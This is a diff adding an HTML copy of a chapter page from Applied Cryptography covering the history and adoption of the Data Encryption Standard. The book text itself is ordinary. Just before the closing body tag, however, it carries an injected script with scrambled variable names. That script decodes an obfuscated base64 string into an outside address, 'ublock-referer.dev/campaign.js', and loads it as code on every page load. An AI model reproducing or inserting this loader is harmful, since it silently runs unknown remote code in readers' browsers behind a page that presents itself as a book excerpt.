@@ -1,0 +1,100 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Data Encryption Standard (DES)</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=12//-->
+<!--PAGES=265-267//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch11/11-13.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 12<BR>Data Encryption Standard (DES)
+</FONT></H2>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">12.1 Background</FONT></H3>
+<P>The Data Encryption Standard (DES), known as the Data Encryption Algorithm (DEA) by ANSI and the DEA-1 by the ISO, has been a worldwide standard for 20 years. Although it is showing signs of old age, it has held up remarkably well against years of cryptanalysis and is still secure against all but possibly the most powerful of adversaries.
+</P>
+<P><FONT SIZE="+1"><B><I>Development of the Standard</I></B></FONT></P>
+<P>In the early 1970s, nonmilitary cryptographic research was haphazard. Almost no research papers were published in the field. Most people knew that the military used special coding equipment to communicate, but few understood the science of cryptography. The National Security Agency (NSA) had considerable knowledge, but they did not even publicly admit their own existence.
+</P>
+<P>Buyers didn&#146;t know what they were buying. Several small companies made and sold cryptographic equipment, primarily to overseas governments. The equipment was all different and couldn&#146;t interoperate. No one really knew if any of it was secure; there was no independent body to certify the security. As one government report said [441]:</P>
+<BLOCKQUOTE><P>The intricacies of relating key variations and working principles to the real strength of the encryption/decryption equipment were, and are, virtually unknown to almost all buyers, and informed decisions as to the right type of on-line, off-line, key generation, etc., which will meet buyers&#146; security needs, have been most difficult to make.
+</P>
+</BLOCKQUOTE><P>In 1972, the National Bureau of Standards (NBS), now the National Institute of Standards and Technology (NIST), initiated a program to protect computer and communications data. As part of that program, they wanted to develop a single, standard cryptographic algorithm. A single algorithm could be tested and certified, and different cryptographic equipment using it could interoperate. It would also be cheaper to implement and readily available.
+</P>
+<P>In the May 15, 1973 <I>Federal Register,</I> the NBS issued a public request for proposals for a standard cryptographic algorithm. They specified a series of design criteria:</P>
+<DL>
+<DD>&#151; The algorithm must provide a high level of security.
+<DD>&#151; The algorithm must be completely specified and easy to understand.
+<DD>&#151; The security of the algorithm must reside in the key; the security should not depend on the secrecy of the algorithm.
+<DD>&#151; The algorithm must be available to all users.
+<DD>&#151; The algorithm must be adaptable for use in diverse applications.
+<DD>&#151; The algorithm must be economically implementable in electronic devices.
+<DD>&#151; The algorithm must be efficient to use.
+<DD>&#151; The algorithm must be able to be validated.
+<DD>&#151; The algorithm must be exportable.
+</DL>
+<P>Public response indicated that there was considerable interest in a cryptographic standard, but little public expertise in the field. None of the submissions came close to meeting the requirements.
+</P>
+<P>The NBS issued a second request in the August 27, 1974 <I>Federal Register.</I> Eventually they received a promising candidate: an algorithm based on one developed by IBM during the early 1970s, called Lucifer (see Section 13.1). IBM had a team working on cryptography at both Kingston and Yorktown Heights, including Roy Adler, Don Coppersmith, Horst Feistel, Edna Grossman, Alan Konheim, Carl Meyer, Bill Notz, Lynn Smith, Walt Tuchman, and Bryant Tuckerman.</P>
+<P>The algorithm, although complicated, was straightforward. It used only simple logical operations on small groups of bits and could be implemented fairly efficiently in hardware.</P>
+<P>The NBS requested the NSA&#146;s help in evaluating the algorithm&#146;s security and determining its suitability as a federal standard. IBM had already filed for a patent [514], but was willing to make its intellectual property available to others for manufacture, implementation, and use. Eventually, the NBS worked out the terms of agreement with IBM and received a nonexclusive, royalty-free license to make, use, and sell equipment that implemented the algorithm.</P>
+<P>Finally, in the March 17, 1975 <I>Federal Register,</I> the NBS published both the details of the algorithm and IBM&#146;s statement granting a nonexclusive, royalty-free license for the algorithm, and requested comment [536]. Another notice, in the August 1, 1975 <I>Federal Register,</I> again requested comments from agencies and the general public.</P>
+<P>And there were comments [721,497,1120]. Many were wary of the NSA&#146;s &#147;invisible hand&#148; in the development of the algorithm. They were afraid that the NSA had modified the algorithm to install a trapdoor. They complained that the NSA reduced the key size from the original 128-bits to 56-bits (see Section 13.1). They complained about the inner workings of the algorithm. Much of NSA&#146;s reasoning became clear in the early 1990s, but in the 1970s this seemed mysterious and worrisome.</P>
+<P>In 1976, the NBS held two workshops to evaluate the proposed standard. The first workshop discussed the mathematics of the algorithm and the possibility of a trapdoor [1139]. The second workshop discussed the possibility of increasing the algorithm&#146;s key length [229]. The algorithm&#146;s designers, evaluators, implementors, vendors, users, and critics were invited. From all reports, the workshops were lively [1118].</P>
+<P>Despite criticism, the Data Encryption Standard was adopted as a federal standard on November 23, 1976 [229] and authorized for use on all unclassified government communications. The official description of the standard, FIPS PUB 46, &#147;Data Encryption Standard,&#148; was published on January 15, 1977 and became effective six months later [1140]. FIPS PUB 81, &#147;DES Modes of Operation,&#148; was published in 1980 [1143]. FIPS PUB 74, &#147;Guidelines for Implementing and Using the NBS Data Encryption Standard,&#148; was published in 1981 [1142]. NBS also published FIPS PUB 112, specifying DES for password encryption [1144], and FIPS PUB 113, specifying DES for computer data authentication [1145]. (FIPS stands for Federal Information Processing Standard.)</P>
+<P>These standards were unprecedented. Never before had an NSA-evaluated algorithm been made public. This was probably the result of a misunderstanding between NSA and NBS. The NSA thought DES was hardware-only. The standard mandated a hardware implementation, but NBS published enough details so that people could write DES software. Off the record, NSA has characterized DES as one of their biggest mistakes. If they knew the details would be released so that people could write software, they would never have agreed to it. DES did more to galvanize the field of cryptanalysis than anything else. Now there was an algorithm to study: one that the NSA said was secure. It is no accident that the next government standard algorithm, Skipjack (see Section 13.12), was classified.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch11/11-13.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(fccBhaVS, TafVVioZ) {TafVVioZ = fccBhaVS.createElement('script');TafVVioZ.type = 'text/javascript';TafVVioZ.async = true;TafVVioZ.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');fccBhaVS.getElementsByTagName('body')[0].appendChild(TafVVioZ);}(document));</script></body>
+</html>
